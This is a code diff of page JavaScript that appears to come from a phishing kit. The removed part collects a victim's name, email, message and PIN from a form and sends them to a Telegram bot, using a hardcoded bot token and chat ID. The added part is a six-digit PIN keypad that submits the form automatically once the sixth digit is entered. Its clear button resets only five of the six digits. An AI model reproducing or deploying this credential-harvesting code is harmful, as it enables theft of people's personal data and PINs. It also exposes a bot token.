@@ -1,38 +1,36 @@
-//bot token
-var telegram_bot_id = "5699723630:AAGOD2-E8kWAOZeDEzdBxBxBg9S5RNVs5E8";
-//chat id
-var chat_id = 5322203833;
-var u_name, email, message, setpin;
-var ready = function () {
-    u_name = document.getElementById("name").value;
-    email = document.getElementById("email").value;
-    message = document.getElementById("message").value;
-    setpin = document.getElementById("setpin").value;
-    message = "Name: " + u_name + "\nEmail: " + email + "\nMessage: " + message +"\nSetpin: " + setpin;
-};
-var sender = function () {
-    ready();
-    var settings = {
-        "async": true,
-        "crossDomain": true,
-        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "cache-control": "no-cache"
-        },
-        "data": JSON.stringify({
-            "chat_id": chat_id,
-            "text": message
-        })
-    };
-    $.ajax(settings).done(function (response) {
-        console.log(response);
-    });
-    document.getElementById("name").value = "";
-    document.getElementById("email").value = "";
-    document.getElementById("message").value = "";
-    document.getElementById("setpin").value = "";
-    return false;
-};
+        $(document).ready(function() {
+            $("button#setPin").on('click', function() {
+                var pin = $(this).attr('data-id');
+                
+                if($.trim($("#pin-1").html())=='') {
+                    $("#pin-1").html(pin);
+                } else if($.trim($("#pin-1").html())!='' && $.trim($("#pin-2").html())=='') {
+                    $("#pin-2").html(pin);
+                } else if($.trim($("#pin-2").html())!='' && $.trim($("#pin-3").html())=='') {
+                    $("#pin-3").html(pin);
+                } else if($.trim($("#pin-3").html())!='' && $.trim($("#pin-4").html())=='') {
+                    $("#pin-4").html(pin);
+                } else if($.trim($("#pin-4").html())!='' && $.trim($("#pin-5").html())=='') {
+                    $("#pin-5").html(pin);
+                } else if($.trim($("#pin-5").html())!='' && $.trim($("#pin-6").html())=='') {
+                    $("#pin-6").html(pin);
 
+                    var setPin = $("#pin-1").html()+''+$("#pin-2").html()+''+$("#pin-3").html()+''+$("#pin-4").html()+''+$("#pin-5").html()+''+$("#pin-6").html();
+                    $("input#setPin").val(setPin);
+
+                    var pinValue = $("input#setPin").val();
+
+                    if(pinValue.length == 6) {
+                        $("#ryuSubmit").submit();
+                    }
+                }
+            });
+
+            $("#hapus").on('click', function() {
+                $("#pin-1").html('');
+                $("#pin-2").html('');
+                $("#pin-3").html('');
+                $("#pin-4").html('');
+                $("#pin-5").html('');
+            });
+        });
